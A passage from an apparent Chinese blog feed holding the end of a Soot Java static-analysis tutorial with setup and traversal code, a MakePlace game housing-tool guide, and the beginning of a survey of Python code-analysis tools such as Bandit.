src="https://s2.loli.net/2022/03/28/cC61pz25HyXhuMq.png" style="zoom:80%;" /><p>CFGViewer 命令行工具</p><ul><li>在 jtp 阶段绘制 cfg，默认生成的是 <code>BriefUnitGraph</code></li></ul><img src="https://s2.loli.net/2022/03/28/i1O2HrKMh8ylac5.jpg" style="zoom:70%;" /><h2 id="过程间分析"><a href="#过程间分析" class="headerlink" title="过程间分析"></a>过程间分析</h2><ul><li>CG 调用图，节点是方法，边是调用<ul><li>需要设置入口点，或多线程跟踪（多个入口点）</li><li>手动构造：遍历所有类的方法，记录方法内的方法调用</li></ul></li><li>ICFG &#x3D; CG + CFG<ul><li>给所有方法的 CFG 加上方法之间互相调用的边（CG）所形成的图</li><li>调用边（call edge）从调用语句（call site）连到被调方法（callee）的入口</li><li>与 CG 不同的是，ICFG 除了调用边，还包含相应的返回边（return edge），从 callee 的出口连到 call site 之后执行的下一个语句。</li></ul></li></ul><p>ICFG</p><ul><li>JimpleBasedInterproceduralCFG：InterproceduralCFG 接口的默认实现<ul><li>包括通过显式调用语句或通过调用 <code>Thread.start()</code> 从 <code>Scene.getEntryPoints()</code> 可达的所有语句</li><li>此类被设计为线程安全的，并且此类的子类也必须以线程安全的方式设计</li></ul></li><li>BackwardsInterproceduralCFG：与 JimpleBasedInterproceduralCFG 相同，但基于倒置的 UnitGraph，用于反向分析。</li><li>OnTheFlyJimpleBasedICFG：实时计算 ICFG，即可以在不预先计算调用图的情况下使用。<ul><li>实现通过类层次结构分析 (CHA) 解析调用，通过 FastHierarchy 实现。</li><li>CHA 由 LocalMustNotAliasAnalysis 支持，用于确定在 InvokeVirtual 或 InvokeInterface 调用点上对象的具体类型已知的情况。在这些情况下，可以具体解决调用，即，对单个目标进行调用。</li><li>为了更精确（sound），对于无法具体解析的 InvokeInterface 调用，OnTheFlyJimpleBasedICFG 要求类路径上的所有类至少加载到签名。这必须在计算 FastHierarchy 之前完成，以便层次结构完好无损。客户端应调用 <code>loadAllClassesOnClassPathToSignatures()</code> 将所有需要的类加载到此级别。</li></ul></li></ul><img src="https://s2.loli.net/2022/03/28/YEjIABgpKGVavsy.png" style="zoom:80%;" /><h1 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h1><p>把 jar 文件解压到文件夹，如图：</p><img src="https://s2.loli.net/2022/02/23/h5dMQPBt4oA8Kkl.png" style="zoom:80%;" /><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>使用 <code>Scene.v().loadBasicClasses()</code> 或 <code>Scene.v().loadNecessaryClasses()</code>，不用都写。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> <span class="string">&quot;C:\\Users\\linki\\Desktop\\demo&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">sourceDirectory</span> <span class="operator">=</span> <span class="string">&quot;C:\\Users\\linki\\Desktop\\demo\\commons-collections-3.1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setupSoot</span><span class="params">()</span> &#123;</span><br><span class="line">    G.reset();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出格式</span></span><br><span class="line">    Options.v().set_output_dir(output); <span class="comment">// 设置 IR Jimple 的输出目录</span></span><br><span class="line">    Options.v().set_output_format(Options.output_format_jimple);</span><br><span class="line"></span><br><span class="line">    Options.v().set_process_dir(Collections.singletonList(sourceDirectory));    <span class="comment">// 待分析的路径</span></span><br><span class="line">    <span class="comment">// Options.v().set_soot_classpath(sourceDirectory);    // JDK 和待分析的 jar 都要加入 classpath</span></span><br><span class="line"></span><br><span class="line">    Options.v().set_prepend_classpath(<span class="literal">true</span>);</span><br><span class="line">    Options.v().set_allow_phantom_refs(<span class="literal">true</span>);</span><br><span class="line">    Options.v().set_keep_line_number(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    Options.v().set_whole_program(<span class="literal">true</span>);    <span class="comment">// 全程序分析</span></span><br><span class="line">    Options.v().set_verbose(<span class="literal">true</span>);          <span class="comment">// 显示详细信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//    Scene.v().loadBasicClasses();</span></span><br><span class="line">    Scene.v().loadNecessaryClasses();   <span class="comment">// 加载 Soot 依赖的类和命令行指定的类</span></span><br><span class="line">    Scene.v().loadDynamicClasses();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h2><p>遍历所有类及其方法，注意：</p><ul><li><code>loadXXX</code> 方法读取的类不多，直接遍历 JDK 路径读取才全面；</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="comment">// 配置</span></span><br><span class="line">    setupSoot();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行分析</span></span><br><span class="line">    PackManager.v().runPacks();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 合计</span></span><br><span class="line">    System.out.printf(<span class="string">&quot;%d = %d + %d + %d%n&quot;</span>,</span><br><span class="line">            Scene.v().getClasses().size(),</span><br><span class="line">            Scene.v().getApplicationClasses().size(),</span><br><span class="line">            Scene.v().getLibraryClasses().size(),</span><br><span class="line">            Scene.v().getPhantomClasses().size()</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历类</span></span><br><span class="line">    <span class="keyword">for</span> (SootClass klass : Scene.v().getClasses()) &#123;</span><br><span class="line">        <span class="comment">// 类名</span></span><br><span class="line">        System.out.println(klass.getName());</span><br><span class="line">        <span class="comment">// 遍历方法</span></span><br><span class="line">        <span class="keyword">for</span> (SootMethod method : klass.getMethods()) &#123;</span><br><span class="line">            <span class="comment">// 方法签名</span></span><br><span class="line">            System.out.println(method.getSignature());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="类信息"><a href="#类信息" class="headerlink" title="类信息"></a>类信息</h2><p>根据类名获得类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SootClass</span> <span class="variable">klass</span> <span class="operator">=</span> Scene.v().getSootClass(<span class="string">&quot;java.io.ObjectInputStream&quot;</span>);</span><br><span class="line">System.out.println(klass.getJavaPackageName());         <span class="comment">// 包名</span></span><br><span class="line">System.out.println(klass.getSuperclass().getName());    <span class="comment">// 父类名</span></span><br><span class="line">System.out.println(klass.getName());                    <span class="comment">// 类名</span></span><br></pre></td></tr></table></figure><h2 id="方法信息"><a href="#方法信息" class="headerlink" title="方法信息"></a>方法信息</h2><p>根据方法签名获得方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SootMethod</span> <span class="variable">method</span> <span class="operator">=</span> Scene.v().getMethod(<span class="string">&quot;&lt;java.io.ObjectInputStream: java.lang.Object readObject()&gt;&quot;</span>);</span><br><span class="line">System.out.println(method.getDeclaringClass().getName());   <span class="comment">// 所属类</span></span><br><span class="line">System.out.println(method.getSignature());                  <span class="comment">// 签名</span></span><br><span class="line">System.out.println(method.getSubSignature());               <span class="comment">// 子签名</span></span><br><span class="line">System.out.println(method.getName());                       <span class="comment">// 方法名</span></span><br></pre></td></tr></table></figure><p>分析方法体，注意：</p><ul><li>有些方法没有方法体，<code>hasActiveBody</code> 将返回 false</li><li><code>retrieveActiveBody</code> 会为没有方法体的方法构建方法体，但可能抛出异常，处理之后第二次调用将得到方法体</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(method.hasActiveBody() + <span class="string">&quot;: &quot;</span> + method.getSignature());</span><br><span class="line"></span><br><span class="line"><span class="comment">// Jimple Body</span></span><br><span class="line"><span class="type">JimpleBody</span> <span class="variable">jb</span> <span class="operator">=</span> (JimpleBody) method.retrieveActiveBody();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历其中的 Unit</span></span><br><span class="line"><span class="keyword">for</span> (Unit u : jb.getUnits()) &#123;</span><br><span class="line">    <span class="comment">// 语句</span></span><br><span class="line">    <span class="type">Stmt</span> <span class="variable">stmt</span> <span class="operator">=</span> (Stmt) u;</span><br><span class="line">    <span class="keyword">if</span> (stmt.containsInvokeExpr()) &#123;</span><br><span class="line">        <span class="type">InvokeExpr</span> <span class="variable">invokeExpr</span> <span class="operator">=</span> stmt.getInvokeExpr();</span><br><span class="line">        invokeExpr.apply(<span class="keyword">new</span> <span class="title class_">AbstractExprSwitch</span>() &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Invoke instance method; special handling for superclass, private, and instance initialization method invocations</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">caseSpecialInvokeExpr</span><span class="params">(SpecialInvokeExpr v)</span> &#123;</span><br><span class="line">                <span class="built_in">super</span>.caseSpecialInvokeExpr(v);</span><br><span class="line">                System.out.println(<span class="string">&quot;(caseSpecialInvokeExpr): &quot;</span> + v.getMethod().getSignature());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Invoke a class (static) method</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">caseStaticInvokeExpr</span><span class="params">(StaticInvokeExpr v)</span> &#123;</span><br><span class="line">                <span class="built_in">super</span>.caseStaticInvokeExpr(v);</span><br><span class="line">                System.out.println(<span class="string">&quot;(caseStaticInvokeExpr): &quot;</span> + v.getMethod().getSignature());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Invoke instance method; dispatch based on class</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">caseVirtualInvokeExpr</span><span class="params">(VirtualInvokeExpr v)</span> &#123;</span><br><span class="line">                <span class="built_in">super</span>.caseVirtualInvokeExpr(v);</span><br><span class="line">                System.out.println(<span class="string">&quot;(caseVirtualInvokeExpr): &quot;</span> + v.getMethod().getSignature());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Invoke dynamic method</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">caseDynamicInvokeExpr</span><span class="params">(DynamicInvokeExpr v)</span> &#123;</span><br><span class="line">                <span class="built_in">super</span>.caseDynamicInvokeExpr(v);</span><br><span class="line">                System.out.println(<span class="string">&quot;(caseDynamicInvokeExpr): &quot;</span> + v.getMethod().getSignature());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Invoke interface method</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">caseInterfaceInvokeExpr</span><span class="params">(InterfaceInvokeExpr v)</span> &#123;</span><br><span class="line">                <span class="built_in">super</span>.defaultCase(v);</span><br><span class="line">                System.out.println(<span class="string">&quot;(caseInterfaceInvokeExpr): &quot;</span> + v.getMethod().getSignature());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">defaultCase</span><span class="params">(Object v)</span> &#123;</span><br><span class="line">                <span class="built_in">super</span>.defaultCase(v);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h1><p>执行流（Packs）没有用过，我个人的一般操作流程是：</p><ol><li>设置 Soot 配置</li><li>读取 .jar</li><li>执行分析</li></ol><h2 id="Soot-配置"><a href="#Soot-配置" class="headerlink" title="Soot 配置"></a>Soot 配置</h2><p>其实上面也有，在列一些</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">initSootOption</span><span class="params">()</span> &#123;</span><br><span class="line">    G.reset();</span><br><span class="line"></span><br><span class="line">    Options.v().set_prepend_classpath(<span class="literal">true</span>);</span><br><span class="line">    Options.v().set_allow_phantom_refs(<span class="literal">true</span>);</span><br><span class="line">    Options.v().set_keep_line_number(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    Options.v().set_whole_program(<span class="literal">true</span>);</span><br><span class="line">    Options.v().set_verbose(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    Scene.v().loadBasicClasses();</span><br><span class="line">    Scene.v().loadDynamicClasses();</span><br><span class="line">    Scene.v().loadClass(<span class="string">&quot;java.lang.Class&quot;</span>, <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        Options.v().set_output_format(Options.output_format_jimple);</span></span><br><span class="line"><span class="comment">//        Options.v().set_validate(true);</span></span><br><span class="line"><span class="comment">//        Options.v().set_ignore_classpath_errors(true); // Ignores invalid entries on the Soot classpath.</span></span><br><span class="line"><span class="comment">//        Options.v().set_no_writeout_body_releasing(true); // 当输出内容后不释放获取的body数据</span></span><br><span class="line"><span class="comment">//        Options.v().set_no_bodies_for_excluded(true);</span></span><br><span class="line"><span class="comment">//        Options.v().set_omit_excepting_unit_edges(true);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">Soot 的基本使用方法及注意点</summary>
    
    
    
    <category term="Other" scheme="https://jckling.github.io/categories/Other/"/>
    
    
    <category term="Java" scheme="https://jckling.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>FF14 MakePlace 使用教程</title>
    <link href="https://jckling.github.io/2022/02/09/Game/FFXIV/FF14-MakePlace%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/"/>
    <id>https://jckling.github.io/2022/02/09/Game/FFXIV/FF14-MakePlace%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</id>
    <published>2022-02-09T02:15:39.000Z</published>
    <updated>2022-02-10T10:32:30.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前太久没上游戏 S 房炸了，现在买了个公寓想试试装修成摄影棚，预览了半天家具，然后搜索到一个装修神器 —— MakePlace。该工具可以让你在本地进行完整的装修预览，目前已支持中文，并且可以过滤掉国际服家具。</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>官网：<a href="https://jawslouis.itch.io/makeplace">https://jawslouis.itch.io/makeplace</a> 拉到网页中间左右有个下载按钮，约 1GB 左右的程序文件，解压后放到想要安装的目录即可。</p><img src="https://s2.loli.net/2022/02/09/m8rVYUv7PFe2hnL.jpg" ><p>建议解压到 MakePlace 文件夹（自己新建），然后拖放到安装目录，双击 MakePlace.exe 即可启动程序。</p><img src="https://s2.loli.net/2022/02/09/rqtAeN6vfZnMFD9.png" ><h1 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h1><p>首先，点击右侧齿轮将语言设置为中文：</p><img src="https://s2.loli.net/2022/02/09/jxr8IbsQ17NOEDA.jpg" ><p>每次保存前都要在设置当中设定文件名称，否则会直接覆盖；加载这里可以看到保存后的文件，还有个示例文件 <code>Clair de Lune</code> 。</p><img src="https://s2.loli.net/2022/02/09/9Ifct7ZLSBRimhr.jpg" ><ul><li>房屋大小可以自行设置，包括：公寓、小型房、中型房、大型房；</li><li>除公寓之外，都可以进入庭院，或从庭院进入房屋，庭院也可以进行装修；</li><li>光照等级是滑动条；</li><li>家具列表显示当前家具可替换的其他家具（？）；</li><li>fixture list 显示固定这几项的设置，点击可以更改。</li></ul><img src="https://s2.loli.net/2022/02/09/mezunhKVlMjyQiP.jpg" ><p>默认是第一视角的走动模式，可以开启飞行模式，从飞行模式切换为走路模式会直接落到地面；下面依次是家具移动、旋转、复制、撤销、重做、删除。</p><img src="https://s2.loli.net/2022/02/09/GCnq652QyLdk3xl.jpg" ><p>左下的选项都用于选择家具，分类方式和游戏内、<a href="https://cn.ff14housing.com/">最终幻想14 住宅区</a>都不一样。</p><img src="https://s2.loli.net/2022/02/09/ARJdctaZNPw93k1.jpg" ><p>X&#x2F;Y&#x2F;Z 轴可以按住移动，右侧面板染色和输入坐标移动。</p><img src="https://s2.loli.net/2022/02/10/lPgfBiRjUWcoatQ.jpg" ><p>最后，按 <code>ESC</code> 退出程序。</p><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>刚开始探索，有个相关插件 <a href="https://github.com/jawslouis/MakePlacePlugin">MakePlacePlugin</a> 可以在游戏中使用，不过看起来只支持国际服。</p><h1 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h1><ul><li><a href="https://jawslouis.itch.io/makeplace">MakePlace</a></li></ul>]]></content>
    
    
    <summary type="html">本地装修模拟器</summary>
    
    
    
    <category term="Game" scheme="https://jckling.github.io/categories/Game/"/>
    
    
    <category term="FFXIV" scheme="https://jckling.github.io/tags/FFXIV/"/>
    
  </entry>
  
  <entry>
    <title>Python 程序分析工具调研</title>
    <link href="https://jckling.github.io/2021/12/30/Security/Python%20%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E8%B0%83%E7%A0%94/"/>
    <id>https://jckling.github.io/2021/12/30/Security/Python%20%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E8%B0%83%E7%A0%94/</id>
    <published>2021-12-30T08:50:11.000Z</published>
    <updated>2023-03-06T15:01:58.480Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Python-程序分析工具调研"><a href="#Python-程序分析工具调研" class="headerlink" title="Python 程序分析工具调研"></a>Python 程序分析工具调研</h2><p>Github 上的开源工具，<code>*</code> 号表示仓库已经不再维护</p><table><thead><tr><th>工具</th><th>描述</th><th>开发语言</th></tr></thead><tbody><tr><td><a href="https://github.com/yinwang0/pysonar2">PySonar2</a></td><td>语义索引器，用于批量处理大型代码库。牺牲实时索引能力，使用过程间分析来推断变量、参数和函数的类型。目前作为大型代码索引服务的基础引擎，Sourcegraph 中也有使用该工具。</td><td>Java</td></tr><tr><td><a href="https://github.com/sourcegraph/sourcegraph">Sourcegraph </a></td><td>代码搜索和导航引擎，帮助阅读和理解大型项目的代码。目前支持 Go、Java、Python 等多种编程语言，能够以浏览器插件的形式提供在线代码阅读的功能。</td><td>Go、TypeScript</td></tr><tr><td><a href="https://github.com/coala/coala">coala</a></td><td>使用配置文件检测和修复代码，可自定义规则和标准检查代码质量，扩展性强。支持 Python、Java、C&#x2F;C++、JavaScript 等多种编程语言，支持作为编辑器插件使用。</td><td>Python</td></tr><tr><td><a href="https://github.com/nvdv/vprof">vprof</a></td><td>性能分析工具，为 Python 程序的运行时间、内存使用情况等提供交互式可视化，不适用于大型代码的分析。</td><td>Python、JavaScript</td></tr><tr><td><a href="https://github.com/scottrogowski/code2flow">Code2Flow</a></td><td>为动态语言生成生成调用图（Call Graph），目前支持 Python、JavaScript、Ruby、PHP。基础流程：<code>AST -&gt; 函数定义 -&gt; 函数调用点 -&gt; 连接点</code> ，主要是提供一个粗略的概览。缺点是没有定义的函数、不同命名空间相同名字的函数将被跳过等，因此并不适用于大型代码的分析。</td><td>Python、JavaScript</td></tr><tr><td><a href="https://github.com/thebjorn/pydeps">pydeps</a></td><td>Python 模块依赖可视化，导出 <code>.svg</code> 或 <code>.png</code> 文件。只考虑导入的文件（模块必须安装），在 Python 字节码中查找导入操作码，同时支持外部模块的分析。</td><td>Python</td></tr><tr><td><a href="https://github.com/gak/pycallgraph">pycallgraph</a>*</td><td>为 Python 应用生成调用图（Call Graph），包括函数的调用次数、执行时间等信息，提供一定程度的性能分析功能。同时支持过滤函数，避免生成的图太大无法分析，默认导出 <code>.png</code> 文件。</td><td>Python</td></tr><tr><td><a href="https://github.com/Yelp/undebt">undebt</a>*</td><td>执行大规模自动化代码重构，根据自定义模式对代码进行查找和替换，适用于任何语言。</td><td>Python</td></tr><tr><td><a href="https://github.com/python-security/pyt">pyt</a>*</td><td>基于理论基础的 Python Web 应用静态分析（控制流图、定点、数据流分析），能够检测 SSRF、SQL 注入、XSS、目录遍历等攻击，支持自定义源点和汇点、传播污点的函数。目前已停更，作者建议使用 Pyre 。</td><td>Python</td></tr><tr><td><a href="https://github.com/facebook/pyre-check">Pyre (Facebook)</a></td><td>性能类型检查器，集成静态分析工具 Pysa（污点分析）Pysa 通过跟踪数据流实现安全检查，依赖类型注释，能够高速处理大型代码。</td><td>OCaml、Python</td></tr><tr><td><a href="https://github.com/PyCQA/bandit">Bandit</a></td><td>构建 AST 并使用插件检查安全问题，最初在 OpenStack 安全项目中开发，后来被重新定位到 PyCQA。主要用于扫描危险函数，支持自定义漏洞测试和扩展插件。</td><td>Python</td></tr><tr><td><a href="https://github.com/CoatiSoftware/Sourcetrail">Sourcetrail</a></td><td>跨平台的源代码浏览器，支持 C&#x2F;C++、Java、Python，提供搜索、代码、图形三个交互式视图。亮点是给出了源代码的结构，但只有符号名称。</td><td>C++、Java</td></tr><tr><td><a href="https://github.com/rubik/radon/">radon</a></td><td>计算源代码的度量（metrics），包括 McCabe、Halstead、可维护性索引三种度量指标，支持在 coala 中使用。主要用于评估代码的复杂度。</td><td>Python</td></tr><tr><td><a href="https://github.com/rubik/xenon">xenon</a></td><td>基于 radon 的监测工具，检查代码复杂性。可应用于 CI&#x2F;CD，在每次提交代码时运行，根据自定义代码复杂性阈值返回成功或失败。</td><td>Python</td></tr><tr><td><a href="https://github.com/davidhalter/jedi">jedi</a></td><td>Python 静态分析工具，侧重于自动补全和跳转，通常作为编辑器的插件使用。</td><td>Python</td></tr><tr><td><a href="https://github.com/python/mypy">mypy</a></td><td>静态类型检查器（PEP 484），能够对 Python 程序中的类型注释执行静态检查。</td><td>Python</td></tr><tr><td><a href="https://github.com/Microsoft/pyright">pyright (Microsoft)</a></td><td>可用于大型 Python 源代码库的快速类型检查器，使用内置的类型存根进行类型推断，可以在监视模式下运行，支持增量更新。</td><td>TypeScript、Python</td></tr><tr><td><a href="https://github.com/google/pytype">pytype (Google)</a></td><td>静态分析器，无需类型注释就能检查和推断 Python 代码的类型，也利用了类型存根（pyi 文件）。</td><td>Python</td></tr><tr><td><a href="https://github.com/jendrikseipp/vulture">Vulture</a></td><td>查找 Python 程序中未使用的代码（死代码），存在漏报，并且隐式调用可能会被误报。支持设置最小置信度、白名单等功能，可以对单个文件或目录的 py 文件执行分析。</td><td>Python</td></tr><tr><td><a href="https://github.com/vitsalis/pycg">PyCG</a></td><td>使用静态分析为 Python 代码生成调用图，支持高阶函数、类继承、导入的模块、嵌套定义。详见论文 <a href="https://vitsalis.com/papers/pycg.pdf">ICSE 2021 paper</a></td><td>Python</td></tr><tr><td><a href="https://github.com/tonybaloney/wily">Wily</a></td><td>复杂性检查</td><td>Python</td></tr><tr><td><a href="https://github.com/PyCQA/mccabe">McCabe</a></td><td>复杂性检查</td><td>Python</td></tr><tr><td><a href="https://github.com/thg-consulting/it">it</a></td><td>代码检查工具&#x2F;框架</td><td>Python</td></tr></tbody></table><p>以及一些闭源工具</p><table><thead><tr><th>工具</th><th></th></tr></thead><tbody><tr><td><a href="https://securitylab.github.com/tools/codeql/">CodeQL</a></td><td>代码分析引擎</td></tr><tr><td><a href="https://www.microfocus.com/en-us/cyberres/application-security/static-code-analyzer">Fortify SCA</a></td><td>静态代码审计工具</td></tr><tr><td><a href="https://marketplace.visualstudio.com/items?itemName=ms-python.vscode-pylance">Pylance (Microsoft)</a></td><td>基于 pyright 的 Python 代码静态分析工具</td></tr><tr><td><a href="https://deepsource.io/">DeepSource</a></td><td>支持多种语言的静态分析，个人免费</td></tr><tr><td><a href="https://www.codacy.com/">Codacy</a></td><td>能够通过静态代码分析获得关于安全问题、代码覆盖率、代码重复率、代码复杂性的信息</td></tr></tbody></table><p>前段时间的 log4j 貌似就是用 CodeQL 找到的👍</p><h2 id="Bandit"><a href="#Bandit" class="headerlink" title="Bandit"></a>Bandit</h2><p>Bandit 可以用来搜索 Python 代码中常见的安全问题，在检测过程中，Bandit 会对每一份 Python 代码文件进行处理，基于 ast 模块生成抽象语法树，然后针对每一个 AST 节点运行相应的检测插件。完成安全扫描之后，Bandit 会直接给用户生成检测报告。</p><p>拿 keystone 源码进行测试，测试插件分组如下，可以通过配置进行选择：</p><table><thead><tr><th>ID</th><th>Description</th></tr></thead><tbody><tr><td>B1xx</td><td>misc tests</td></tr><tr><td>B2xx</td><td>application&#x2F;framework misconfiguration</td></tr><tr><td>B3xx</td><td>blacklists (calls)</td></tr><tr><td>B4xx</td><td>blacklists (imports)</td></tr><tr><td>B5xx</td><td>cryptography</td></tr><tr><td>B6xx</td><td>injection</td></tr><tr><td>B7xx</td><td>XSS</td></tr></tbody></table><h3 id="测试-keystone"><a href="#测试-keystone" class="headerlink" title="测试 keystone"></a>测试 keystone</h3><p>环境准备</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># virtualenv</span></span><br><span class="line">sudo apt install python3-virtualenv -y</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建虚拟环境</span></span><br><span class="line">virtualenv bandit-env</span><br><span class="line">python3 -m venv bandit-env</span><br><span class="line"></span><br><span class="line"><span class="comment"># 激活虚拟环境</span></span><br><span class="line"><span class="built_in">source</span> bandit-env/bin/activate</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装 Bandit</span></span><br><span class="line">pip install bandit</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建测试目录</span></span><br><span class="line"><span class="built_in">mkdir</span> bandit-test &amp;&amp; <span class="built_in">cd</span> bandit-test</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载 keystone 